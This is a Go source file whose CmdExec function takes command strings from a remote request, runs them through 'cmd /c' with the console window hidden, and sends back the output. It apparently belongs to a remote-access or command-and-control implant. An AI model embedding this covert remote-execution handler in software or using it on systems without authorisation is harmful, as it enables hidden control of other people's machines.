package proc

import (
	"bytes"
	"errors"
	"github.com/pygrum/Empress/transport"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func CmdExec(req *transport.Request, response *transport.Response) {
	for _, arg := range req.Args {
		command := string(arg)
		tokens := strings.Split(command, " ")
		for i, t := range tokens {
			tokens[i] = os.ExpandEnv(t)
		}
		cmd := exec.Command("cmd", "/c", tokens...)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}
		var cOut, cErr bytes.Buffer
		cmd.Stdout = &cOut
		cmd.Stderr = &cErr
		if err := cmd.Run(); err != nil {
			errStr := cErr.String()
			if len(errStr) == 0 {
				errStr = err.Error()
				if len(errStr) == 0 {
					errStr = cOut.String()
				}
			}
			transport.ResponseWithError(response, errors.New(errStr))
			return
		}
		transport.AddResponse(response, transport.ResponseDetail{
			Status: transport.StatusSuccess,
			Dest:   transport.DestStdout,
			Data:   cOut.Bytes(),
		})
	}
}
